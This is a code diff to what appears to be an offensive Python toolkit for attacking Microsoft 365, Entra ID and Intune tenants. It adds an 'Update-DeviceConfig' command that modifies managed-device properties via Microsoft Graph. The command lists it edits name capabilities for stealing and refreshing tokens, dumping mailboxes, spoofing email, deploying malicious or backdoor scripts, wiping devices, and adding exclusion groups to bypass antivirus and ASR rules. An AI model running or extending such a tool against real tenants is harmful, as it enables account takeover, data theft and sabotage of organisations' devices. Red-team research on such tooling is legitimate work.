@@ -153,7 +153,8 @@ def list_commands():
         ["Get-DeviceGroupPolicyConfigurations", "Get device group policy configurations and assignment details"],
         ["Get-DeviceGroupPolicyDefinition", "Get device group policy definition"],
         ["Get-RoleDefinitions", "Get role definitions"],
-        ["Get-RoleAssignments", "Get role assignments"]
+        ["Get-RoleAssignments", "Get role assignments"],
+        ["Get-DeviceCompliancePolicies", "Get device compliance policies"]
     ]
 
     intune_exploit = [
@@ -174,13 +175,12 @@ def list_commands():
         ["Display-EDRPolicyRules", "Display EDR policy rules"],
         ["Display-LAPSAccountProtectionPolicyRules", "Display LAPS account protection policy rules"],
         ["Display-UserGroupAccountProtectionPolicyRules", "Display user group account protection policy rules"],
-        ["Get-DeviceCompliancePolicies", "Get device compliance policies"],
         ["Add-ExclusionGroupToPolicy", "Bypass av, asr, etc. rules by adding an exclusion group containing compromised user or device"],
         ["Reboot-Device", "Reboot managed device"],
         ["Retire-Device", "Retire managed device"],
         ["Lock-Device", "Lock managed device"],
-        ["Shutdown-Device", "Shutdown managed device"]
-        # Update-ManagedDevice - apply/update new device config 
+        ["Shutdown-Device", "Shutdown managed device"],
+        ["Update-DeviceConfig", "Update properties of the managed device configuration"]
     ]
 
     cleanup_commands = [
@@ -638,32 +638,32 @@ def main():
         sys.exit()
 
     available_commands = [
-    "invoke-reconasoutsider","invoke-userenumerationasoutsider","get-graphtokens", "get-tenantid", "get-tokenscope", "decode-accesstoken",
-    "invoke-refreshtomsgraphtoken", "invoke-refreshtoazuremanagementtoken", "invoke-refreshtovaulttoken",
-    "invoke-refreshtomsteamstoken", "invoke-refreshtoofficeappstoken", "invoke-refreshtoofficemanagementtoken",
-    "invoke-refreshtooutlooktoken", "invoke-refreshtosubstratetoken", "invoke-refreshtoyammertoken", "invoke-refreshtointuneenrollment",
-    "invoke-refreshtoonedrivetoken", "invoke-refreshtosharepointtoken", "invoke-certtoaccesstoken", "invoke-estscookietoaccesstoken", "invoke-appsecrettoaccesstoken",
-    "new-signedjwt", "get-currentuser", "get-currentuseractivity", "get-orginfo", "get-domains", "get-user", "get-userproperties", 
-    "get-userprivileges", "get-usertransitivegroupmembership", "get-group", "get-groupmember", "get-userapproleassignments", "get-serviceprincipalapproleassignments",
-    "get-conditionalaccesspolicy", "get-personalcontacts", "get-crosstenantaccesspolicy", "get-partnercrosstenantaccesspolicy", 
-    "get-userchatmessages", "get-administrativeunitmember", "get-onedrivefiles", "get-userpermissiongrants", "get-oauth2permissiongrants", 
-    "get-messages", "get-temporaryaccesspassword", "get-password", "list-authmethods", "list-directoryroles", "list-notebooks", 
-    "list-conditionalaccesspolicies", "list-conditionalauthenticationcontexts", "list-conditionalnamedlocations", "list-sharepointroot", 
-    "list-sharepointsites","list-sharepointurls", "list-externalconnections", "list-applications", "list-serviceprincipals", "list-tenants", "list-joinedteams", 
-    "list-chats", "list-chatmessages", "list-devices", "list-administrativeunits", "list-onedrives", "list-recentonedrivefiles", "list-onedriveurls",
-    "list-sharedonedrivefiles", "invoke-customquery", "invoke-search", "find-privilegedroleusers", "find-updatablegroups", "find-dynamicgroups","find-securitygroups", 
-    "locate-objectid", "update-userpassword", "add-applicationpassword", "add-usertap", "add-groupmember", "create-application", 
-    "create-newuser", "invite-guestuser", "assign-privilegedrole", "open-owamailboxinbrowser", "dump-owamailbox", "spoof-owaemailmessage", 
-    "delete-user", "delete-group", "remove-groupmember", "delete-application", "delete-device", "wipe-device", "retire-device",
-    "get-manageddevices", "get-userdevices", "get-caps", "get-devicecategories", "get-devicecompliancepolicies", 
-    "get-devicecompliancesummary", "get-deviceconfigurations", "get-deviceconfigurationpolicies", "get-deviceconfigurationpolicysettings", 
-    "get-deviceenrollmentconfigurations", "get-devicegrouppolicyconfigurations","update-userproperties", "dump-windowsapps", "dump-iosapps", "dump-androidapps",
-    "get-devicegrouppolicydefinition", "dump-devicemanagementscripts", "get-scriptcontent", "find-privilegedapplications", "dump-macosapps",
-    "get-roledefinitions", "get-roleassignments", "display-avpolicyrules", "display-asrpolicyrules", "display-diskencryptionpolicyrules", 
-    "display-firewallrulepolicyrules", "display-lapsaccountprotectionpolicyrules", "display-usergroupaccountprotectionpolicyrules", "get-appserviceprincipal",
-    "display-edrpolicyrules","add-exclusiongrouptopolicy", "deploy-maliciousscript", "reboot-device", "shutdown-device", "lock-device", "backdoor-script",
-    "add-applicationpermission", "new-signedjwt", "add-applicationcertificate", "get-application", "locate-permissionid", "get-serviceprincipal", "grant-appadminconsent"
-]
+        "invoke-reconasoutsider","invoke-userenumerationasoutsider","get-graphtokens", "get-tenantid", "get-tokenscope", "decode-accesstoken",
+        "invoke-refreshtomsgraphtoken", "invoke-refreshtoazuremanagementtoken", "invoke-refreshtovaulttoken",
+        "invoke-refreshtomsteamstoken", "invoke-refreshtoofficeappstoken", "invoke-refreshtoofficemanagementtoken",
+        "invoke-refreshtooutlooktoken", "invoke-refreshtosubstratetoken", "invoke-refreshtoyammertoken", "invoke-refreshtointuneenrollment",
+        "invoke-refreshtoonedrivetoken", "invoke-refreshtosharepointtoken", "invoke-certtoaccesstoken", "invoke-estscookietoaccesstoken", "invoke-appsecrettoaccesstoken",
+        "new-signedjwt", "get-currentuser", "get-currentuseractivity", "get-orginfo", "get-domains", "get-user", "get-userproperties", 
+        "get-userprivileges", "get-usertransitivegroupmembership", "get-group", "get-groupmember", "get-userapproleassignments", "get-serviceprincipalapproleassignments",
+        "get-conditionalaccesspolicy", "get-personalcontacts", "get-crosstenantaccesspolicy", "get-partnercrosstenantaccesspolicy", 
+        "get-userchatmessages", "get-administrativeunitmember", "get-onedrivefiles", "get-userpermissiongrants", "get-oauth2permissiongrants", 
+        "get-messages", "get-temporaryaccesspassword", "get-password", "list-authmethods", "list-directoryroles", "list-notebooks", 
+        "list-conditionalaccesspolicies", "list-conditionalauthenticationcontexts", "list-conditionalnamedlocations", "list-sharepointroot", 
+        "list-sharepointsites","list-sharepointurls", "list-externalconnections", "list-applications", "list-serviceprincipals", "list-tenants", "list-joinedteams", 
+        "list-chats", "list-chatmessages", "list-devices", "list-administrativeunits", "list-onedrives", "list-recentonedrivefiles", "list-onedriveurls",
+        "list-sharedonedrivefiles", "invoke-customquery", "invoke-search", "find-privilegedroleusers", "find-updatablegroups", "find-dynamicgroups","find-securitygroups", 
+        "locate-objectid", "update-userpassword", "add-applicationpassword", "add-usertap", "add-groupmember", "create-application", 
+        "create-newuser", "invite-guestuser", "assign-privilegedrole", "open-owamailboxinbrowser", "dump-owamailbox", "spoof-owaemailmessage", 
+        "delete-user", "delete-group", "remove-groupmember", "delete-application", "delete-device", "wipe-device", "retire-device",
+        "get-manageddevices", "get-userdevices", "get-caps", "get-devicecategories", "get-devicecompliancepolicies", "update-deviceconfig",
+        "get-devicecompliancesummary", "get-deviceconfigurations", "get-deviceconfigurationpolicies", "get-deviceconfigurationpolicysettings", 
+        "get-deviceenrollmentconfigurations", "get-devicegrouppolicyconfigurations","update-userproperties", "dump-windowsapps", "dump-iosapps", "dump-androidapps",
+        "get-devicegrouppolicydefinition", "dump-devicemanagementscripts", "get-scriptcontent", "find-privilegedapplications", "dump-macosapps",
+        "get-roledefinitions", "get-roleassignments", "display-avpolicyrules", "display-asrpolicyrules", "display-diskencryptionpolicyrules", 
+        "display-firewallrulepolicyrules", "display-lapsaccountprotectionpolicyrules", "display-usergroupaccountprotectionpolicyrules", "get-appserviceprincipal",
+        "display-edrpolicyrules","add-exclusiongrouptopolicy", "deploy-maliciousscript", "reboot-device", "shutdown-device", "lock-device", "backdoor-script",
+        "add-applicationpermission", "new-signedjwt", "add-applicationcertificate", "get-application", "locate-permissionid", "get-serviceprincipal", "grant-appadminconsent"
+    ]
 
 
     properties = [
@@ -736,7 +736,7 @@ def main():
             "list-chatmessages", "list-devices", "list-administrativeunits", "list-onedrives", "list-recentonedrivefiles", "list-onedriveurls",
             "list-sharedonedrivefiles", "invoke-customquery", "invoke-search", "find-privilegedroleusers", 
             "find-updatablegroups", "find-dynamicgroups","find-securitygroups", "locate-objectid", "update-userpassword", "add-applicationpassword", 
-            "add-usertap", "add-groupmember", "create-application", "create-newuser", "invite-guestuser", 
+            "add-usertap", "add-groupmember", "create-application", "create-newuser", "invite-guestuser", "update-deviceconfig",
             "assign-privilegedrole", "open-owamailboxinbrowser", "dump-owamailbox", "spoof-owaemailmessage", "dump-androidapps",
             "delete-user", "delete-group", "remove-groupmember", "delete-application", "delete-device", "wipe-device", "retire-device",
             "get-caps", "get-devicecategories", "display-devicecompliancepolicies", "get-devicecompliancesummary", "dump-macosapps",
@@ -994,10 +994,7 @@ def main():
                 usernames = [line.strip() for line in file if line.strip()]
         else:
             usernames = [args.username]
-                        
-        #print("UserName                     Exists")
-        #print("--------                     ------")
-        
+     
         for username in usernames:
             exists = None
             try:
@@ -3786,7 +3783,7 @@ def main():
             'User-Agent': user_agent
         }
 
-        print("\033[34m~> Property Definitions: https://learn.microsoft.com/en-us/graph/api/user-update\033[0m")
+        print("\033[34m[>] Property Definitions: https://learn.microsoft.com/en-us/graph/api/user-update\033[0m")
 
         try:
             userproperty = input("\nEnter Property: ").strip()
@@ -3956,7 +3953,7 @@ openssl pkcs12 -export -out certificate.pfx -inkey private.key -in certificate.c
         api_url = f"https://graph.microsoft.com/beta/myorganization/applications(appId='{args.id}')"  # app id
         #api_url = f"https://graph.microsoft.com/v1.0/myorganization/applications/{args.id}"  # object id
 
-        print("\033[34m~> API Permissions: https://learn.microsoft.com/en-us/graph/permissions-reference\033[0m")
+        print("\033[34m[>] API Permissions: https://learn.microsoft.com/en-us/graph/permissions-reference\033[0m")
         
         # permission id validation
         def parse_permissionid(content):
@@ -5848,9 +5845,6 @@ openssl pkcs12 -export -out certificate.pfx -inkey private.key -in certificate.c
             print_red(response.text)
         print("=" * 80)
 
-    # update-manageddeviceconfig - todo 
-    # https://learn.microsoft.com/en-us/graph/api/intune-devices-manageddevice-update?view=graph-rest-beta
-
     # deploy-maliciousscript
     elif args.command and args.command.lower() == "deploy-maliciousscript":
         if not args.script:
@@ -6097,6 +6091,80 @@ openssl pkcs12 -export -out certificate.pfx -inkey private.key -in certificate.c
 
     # deploy-maliciouswin32msi
     # - after confirming win32exe 
+
+    # update-deviceconfig
+    elif args.command and args.command.lower() == "update-deviceconfig":
+        if not args.id:
+            print_red("[-] Error: --id required for Update-DeviceConfig command")
+            return
+
+        properties = [
+            {
+                "Property": "ownerType",
+                "Description": "Ownership of the device. Possible values are, 'company' or 'personal'. Default is unknown. Supports $filter operator 'eq' and 'or'. Possible values are: unknown, company, personal."
+            },
+            {
+                "Property": "managedDeviceOwnerType",
+                "Description": "Ownership of the device. Can be 'company' or 'personal'. Possible values are: unknown, company, personal."
+            },
+            {
+                "Property": "managedDeviceName",
+                "Description": "Automatically generated name to identify a device. Can be overwritten to a user friendly name."
+            },
+            {
+                "Property": "notes",
+                "Description": "Notes on the device created by IT Admin. Default is null. To retrieve actual values GET call needs to be made, with device id and included in select parameter. Supports: $select. $Search is not supported."
+            },
+            {
+                "Property": "roleScopeTagIds",
+                "Description": "List of Scope Tag IDs for this Device instance."
+            },
+            {
+                "Property": "configurationManagerClientHealthState",
+                "Description": "Configuration manager client health state, valid only for devices managed by MDM/ConfigMgr Agent."
+            },
+            {
+                "Property": "configurationManagerClientInformation",
+                "Description": "Configuration manager client information, valid only for devices managed, duel-managed or tri-managed by ConfigMgr Agent."
+            }
+        ]
+
+        print_yellow("\n[*] Update-DeviceConfig")
+        print("=" * 80)
+        print("\033[34m[>] Device Properties: https://learn.microsoft.com/en-us/graph/api/intune-devices-manageddevice-update\033[0m\n")
+        api_url = f"https://graph.microsoft.com/beta/deviceManagement/managedDevices('{args.id}')"
+
+        user_agent = get_user_agent(args)
+        headers = {
+            'Authorization': f'Bearer {access_token}',
+            'Content-Type': 'application/json',
+            'User-Agent': user_agent
+        }
+
+        table = [[prop["Property"], prop["Description"]] for prop in properties]
+        separator = ['-' * 20, '-' * 50]
+
+        tablenew = tabulate([["Property", "Description"]] + [separator] + table, headers="firstrow", tablefmt="plain", colalign=("left", "left"))
+        print(tablenew)
+
+        try:
+            prop = input("\nEnter Property: ").strip()
+            newvalue = input("Enter New Value: ").strip()
+        except KeyboardInterrupt:
+            sys.exit()
+
+        json_body = {
+                prop : newvalue
+            }
+
+        response = requests.patch(api_url, headers=headers, data=json.dumps(json_body))
+        if response.ok:
+            print_green("\n[+] Device config updated successfully")
+        
+        else:
+            print_red(f"\n[-] Failed to update device config: {response.status_code}")
+            print_red(response.text)
+        print("=" * 80)
 
     # reboot-device 
     elif args.command and args.command.lower() == "reboot-device":
